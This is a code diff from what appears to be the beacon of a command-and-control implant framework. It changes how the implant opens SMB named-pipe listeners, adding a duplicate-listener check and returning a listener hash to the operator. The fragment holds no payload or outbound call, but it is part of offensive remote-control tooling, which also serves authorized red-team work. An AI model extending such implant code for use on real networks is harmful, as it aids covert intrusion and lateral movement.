@@ -426,13 +426,31 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		{
 			if(splitedCmd[1]=="smb")
 			{
-				std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>("", 9999);
-				std::string listenerHash = listenerSmb->getListenerHash();
-				m_listeners.push_back(std::move(listenerSmb));
+				std::string pipeName = splitedCmd[2];
+				int localPort = 0;
 
-				// Respond with the listener hash
-				c2RetMessage.set_cmd(cmd);
-				c2RetMessage.set_returnvalue(listenerHash);
+				std::vector<unique_ptr<Listener>>::iterator object = 
+					find_if(m_listeners.begin(), m_listeners.end(),
+							[&](unique_ptr<Listener> & obj){ return obj->getHost() == pipeName;}
+							);
+
+				if(object!=m_listeners.end())
+				{
+					std::string msg = "Listener already exist";
+					// Respond the listener already exist
+					c2RetMessage.set_cmd("");
+					c2RetMessage.set_returnvalue(msg);
+				}
+				else
+				{
+					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(pipeName, localPort);
+					std::string listenerHash = listenerSmb->getListenerHash();
+					m_listeners.push_back(std::move(listenerSmb));
+
+					// Respond with the listener hash
+					c2RetMessage.set_cmd(cmd);
+					c2RetMessage.set_returnvalue(listenerHash);
+				}
 			}
 			else if(splitedCmd[1]=="tcp")
 			{
